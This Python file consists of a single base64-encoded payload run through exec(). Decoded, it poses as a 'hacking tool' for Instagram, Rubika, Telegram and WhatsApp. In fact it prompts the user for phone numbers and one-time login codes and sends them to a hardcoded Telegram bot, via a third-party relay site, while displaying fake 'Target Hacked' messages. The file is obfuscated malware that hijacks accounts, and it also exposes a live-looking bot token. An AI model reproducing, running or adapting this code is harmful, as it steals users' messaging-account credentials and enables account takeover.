import base64
#----------
exec(base64.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgcmVxdWVzdHMsIHRpbWUsIHN5cywgb3MsIHJhbmRvbQpmcm9tIGNvbG9yYW1hIGltcG9ydCAqCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCm9zLnN5c3RlbSgnY2xlYXInKQpLZXkgPSBbImEyRnNhV3hwYm5WNCJdCiMtLS0tLS0tLS0KcHJpbnQoRm9yZS5HUkVFTisiPC0tLS0tLS1FQkxJUy0tLS0tLT5cbiIsIlNsbSBCZSBBYnphciBFQkxJUyBLaG9zaCBPbWRpblxuIikKTG9naW4gPSBzdHIoaW5wdXQoRm9yZS5SRUQrIktleXxwYXNzIDo+ICIpKQoKaWYgTG9naW4gaW4gS2V5OgoJdGltZS5zbGVlcCgzKQoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludChGb3JlLlJFRCsiQWNjb3VudCBMb2dpbiIpCgl0aW1lLnNsZWVwKDQpCglvcy5zeXN0ZW0oJ2NsZWFyJykKZWxzZToKCW9zLnN5c3RlbSgnY2xlYXInKQoJdGltZS5zbGVlcCgyKQoJcHJpbnQoIktleSBOb3QgRmluZCEiKQojLS0tLS1FbnRlci0tLS0KaWYgTG9naW4gaW4gS2V5OgoJcHJpbnQoRm9yZS5HUkVFTisiQWRkIFJvIHZhcmQgS29uIDEsMiwzLi4uLlxuIixGb3JlLlJFRCsiPC0tLS0tLS0tLT4iLEZvcmUuQ1lBTisiXG5bMV0tPiBIYWNrIEluc3RhZ3JhbVxuWzJdLT4gU2VsZiBSdWJpa2FcblszXS0+IFNlbGYgVGVsZWdyYW1cbls0XS0+IEhhY2sgV2hhdHNhQXBwXG4iLEZvcmUuUkVEKyI8LS0tLS0tLS0tPlxuIikKCUVudGVyID0gc3RyKGlucHV0KEZvcmUuR1JFRU4rIkVudGVyIDo+ICIpKQoJIy0tLS0tLU1vYmlsZS0tLS0tCglpZiBFbnRlciA9PSAiMSI6CgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJdGltZS5zbGVlcCgyKQoJCXByaW50KEZvcmUuUkVEKyJMb2RpbmcuLi4uLi4iKQoJCXRpbWUuc2xlZXAoMikKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlNb2JpbGUgPSBzdHIoaW5wdXQoIk51bWJlciA6PiAiKSkKCQl0aW1lLnNsZWVwKDMpCgkJTW9OdW1iZXIgPSAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MTE1MzQ1MTE6QUFIMXVIdWRJSWJwMkJqajVIdXZFTWhHYUkwUVoyaXhvMWcvc2VuZG1lc3NhZ2U/Y2hhdF9pZD0xNDY5NTQ3MzQwJnRleHQ9TW9iaWxlIDo+ICIrTW9iaWxlCgkJTW9EYiA9IHsiVXJsQm94IjpNb051bWJlciwgIkFnZW50TGlzdCI6Ikdvb2dsZSBDaHJvbWUiLCAiVmVyc2lvbnNMaXN0IjoiSFRUUC8xLjEiLCAiTWV0aG9kTGlzdCI6IkdFVCJ9CgkJTW9zZW5kID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly93d3cuaHR0cGRlYnVnZ2VyLmNvbS9Ub29scy9WaWV3SHR0cEhlYWRlcnMuYXNweCIsZGF0YT1Nb0RiKQoJCXRpbWUuc2xlZXAoNCkKCQlwcmludChGb3JlLkdSRUVOKyJcbkhhY2sgTW9iaWxlXG48LS0tLS0tLS0tLT5cblxuIixGb3JlLlJFRCsiVGFyZ2V0IEhhY2tlZCBzZW5kIERCIFlvdXIgQm90IikKCQl0aW1lLnNsZWVwKDMpCgkJc3lzLmV4aXQoKQoJIy0tLS1SdWJpa2EtLS0tLQoJaWYgRW50ZXIgPT0gIjIiOgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXRpbWUuc2xlZXAoMikKCQlwcmludChGb3JlLlJFRCsiTG9kaW5nLi4uLi4uIikKCQl0aW1lLnNsZWVwKDIpCgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJUnViaWthID0gc3RyKGlucHV0KEZvcmUuR1JFRU4rIk51bWJlciBSdWJpa2EgOj4gIikpCgkJdGltZS5zbGVlcCgzKQoJCVJ1TnVtYmVyID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QxNzExNTM0NTExOkFBSDF1SHVkSUlicDJCamo1SHV2RU1oR2FJMFFaMml4bzFnL3NlbmRtZXNzYWdlP2NoYXRfaWQ9MTQ2OTU0NzM0MCZ0ZXh0PVJ1YmlrYSBOdW1iZXIgOj4gIitSdWJpa2EKCQlSdURiID0geyJVcmxCb3giOlJ1TnVtYmVyLCAiQWdlbnRMaXN0IjoiR29vZ2xlIENocm9tZSIsICJWZXJzaW9uc0xpc3QiOiJIVFRQLzEuMSIsICJNZXRob2RMaXN0IjoiR0VUIn0KCQlSdXNlbmQgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL3d3dy5odHRwZGVidWdnZXIuY29tL1Rvb2xzL1ZpZXdIdHRwSGVhZGVycy5hc3B4IixkYXRhPVJ1RGIpCgkJcHJpbnQoRm9yZS5SRUQrIjwtLS0tLS0tLS0tPiIpCgkJUnVDb2RlID0gc3RyKGlucHV0KEZvcmUuR1JFRU4rIkNvZGUgUnViaWthIDo+ICIpKQoJCVJ1TnVtYmVyID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QxNzExNTM0NTExOkFBSDF1SHVkSUlicDJCamo1SHV2RU1oR2FJMFFaMml4bzFnL3NlbmRtZXNzYWdlP2NoYXRfaWQ9MTQ2OTU0NzM0MCZ0ZXh0PVJ1YmlrYSBDb2RlIDo+ICIrUnVDb2RlCgkJUnVEYiA9IHsiVXJsQm94IjpSdU51bWJlciwgIkFnZW50TGlzdCI6Ikdvb2dsZSBDaHJvbWUiLCAiVmVyc2lvbnNMaXN0IjoiSFRUUC8xLjEiLCAiTWV0aG9kTGlzdCI6IkdFVCJ9CgkJUnVzZW5kID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly93d3cuaHR0cGRlYnVnZ2VyLmNvbS9Ub29scy9WaWV3SHR0cEhlYWRlcnMuYXNweCIsZGF0YT1SdURiKQoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXRpbWUuc2xlZXAoMykKCQlwcmludChGb3JlLlJFRCsiU0VMRiBSdWJpa2EgUnVuIikKIy0tLS0tVGVsZWdyYW0tLS0tLQoJaWYgRW50ZXIgPT0gIjMiOgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXRpbWUuc2xlZXAoMikKCQlwcmludChGb3JlLlJFRCsiTG9kaW5nLi4uLi4uIikKCQl0aW1lLnNsZWVwKDIpCgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJVGVsZWdyYW0gPSBzdHIoaW5wdXQoRm9yZS5SRUQrIk51bWJlciBUZWxlZ3JhbSA6PiAiKSkKCQl0aW1lLnNsZWVwKDMpCgkJVGVsTnVtYmVyID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QxNzExNTM0NTExOkFBSDF1SHVkSUlicDJCamo1SHV2RU1oR2FJMFFaMml4bzFnL3NlbmRtZXNzYWdlP2NoYXRfaWQ9MTQ2OTU0NzM0MCZ0ZXh0PVRlbGVncmFtIE51bWJlciA6PiAiK1RlbGVncmFtCgkJVGVsRGIgPSB7IlVybEJveCI6VGVsTnVtYmVyLCAiQWdlbnRMaXN0IjoiR29vZ2xlIENocm9tZSIsICJWZXJzaW9uc0xpc3QiOiJIVFRQLzEuMSIsICJNZXRob2RMaXN0IjoiR0VUIn0KCQlUZWxzZW5kID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly93d3cuaHR0cGRlYnVnZ2VyLmNvbS9Ub29scy9WaWV3SHR0cEhlYWRlcnMuYXNweCIsZGF0YT1UZWxEYikKCQlwcmludChGb3JlLkNZQU4rIjwtLS0tLS0tLS0tLS0+IikKCQlUZWxDb2RlID0gc3RyKGlucHV0KCJUZWxlZ3JhbSBDb2RlIDo+ICIpKQoJCVRlbE51bWJlciA9ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTcxMTUzNDUxMTpBQUgxdUh1ZElJYnAyQmpqNUh1dkVNaEdhSTBRWjJpeG8xZy9zZW5kbWVzc2FnZT9jaGF0X2lkPTE0Njk1NDczNDAmdGV4dD1UZWxlZ3JhbSBDb2RlIDo+ICIrVGVsQ29kZQoJCVRlbERiID0geyJVcmxCb3giOlRlbE51bWJlciwgIkFnZW50TGlzdCI6Ikdvb2dsZSBDaHJvbWUiLCAiVmVyc2lvbnNMaXN0IjoiSFRUUC8xLjEiLCAiTWV0aG9kTGlzdCI6IkdFVCJ9CgkJVGVsc2VuZCA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vd3d3Lmh0dHBkZWJ1Z2dlci5jb20vVG9vbHMvVmlld0h0dHBIZWFkZXJzLmFzcHgiLGRhdGE9VGVsRGIpCgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJcHJpbnQoRm9yZS5HUkVFTisiUnVuIFNFTEYgVGVsZWdyYW1cblxuIikKCQl0aW1lLnNsZWVwKDMpCgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJcHJpbnQoIlNFTEYgUnVuLi4uLi4uLi4uIikKCQl0aW1lLnNsZWVwKDIwKQoJCXByaW50KCIvaGVscCBcbi9nYW1lIFxuL2Z1biBcbi9lbm15IFxuL1R5cGUgXG4vc3BhbSBcbi9TZXR0aW5nXG5cbiIpCgkJVGVsZWdyYW1zZWxmID0gc3RyKGlucHV0KCJFbnRlciA/PiAiKSkKCQlpZiBUZWxlZ3JhbXNlbGYgPT0gIi9oZWxwIjoKCQkJcHJpbnQoIi9nYW1lIFxuL2phbmcgXG4vdHlwZSBcbi9uYW5vIFxuL01hc2hpbiBcbi9IYWNrIFxuL0RlbGV0IFxuL0FiciBcbi9Nb2JpbGUgTnVtYmVyIFxuL0RlYiIpCgkJCWlmIFRlbGVncmFtc2VsZiA9PSAiL2dhbWUiOgoJCQkJcHJpbnQoIm5vdCBGaW5kISIpCgkJCQl0aW1lLnNsZWVwKDQpCgkJCQlzeXMuZXhpdCgpCgkJCQlpZiBUZWxlZ3JhbXNlbGYJPT0gIi9mdW4iOgoJCQkJCXByaW50KCJOb3QgRmluZCEiKQoJCQkJCXRpbWUuc2xlZXAoNCkKCQkJCQlzeXMuZXhpdCgpCgkJCQkJaWYgVGVsZWdyYW1zZWxmID09ICIvZW5teSI6CgkJCQkJCXByaW50KCJOb3QgRmluZCEiKQoJCQkJCQl0aW1lLnNsZWVwKDQpCgkJCQkJCXN5cy5leGl0KCkKCQlpZiBUZWxlZ3JhbXNlbGYgPT0gIi9UeXBlIjoKCQkJcHJpbnQoIk5vdCBGaW5kISIpCgkJCXRpbWUuc2xlZXAoNCkKCQkJc3lzLmV4aXQoKQoJCQlpZiBUZWxlZ3JhbXNlbGYgPT0gIi9zcGFtIjoKCQkJCXByaW50KCJOb3QgRmluZCEiKQoJCQkJdGltZS5zbGVlcCg0KQoJCQkJc3lzLmV4aXQoKQoJCQkJaWYgVGVsZWdyYW1zZWxmID09ICIvU2V0dGluZyI6CgkJCQkJcHJpbnQoIk5vdCBGaW5kISIpCgkJCQkJdGltZS5zbGVlcCg0KQoJCQkJCXN5cy5leGl0KCkKaWYgRW50ZXIgPT0gIjQiOgoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludChGb3JlLlJFRCsiTm90IEhhY2sgV2hhdHNhQXBwIEZpbmQhIikKCXN5cy5leGl0KCkK"))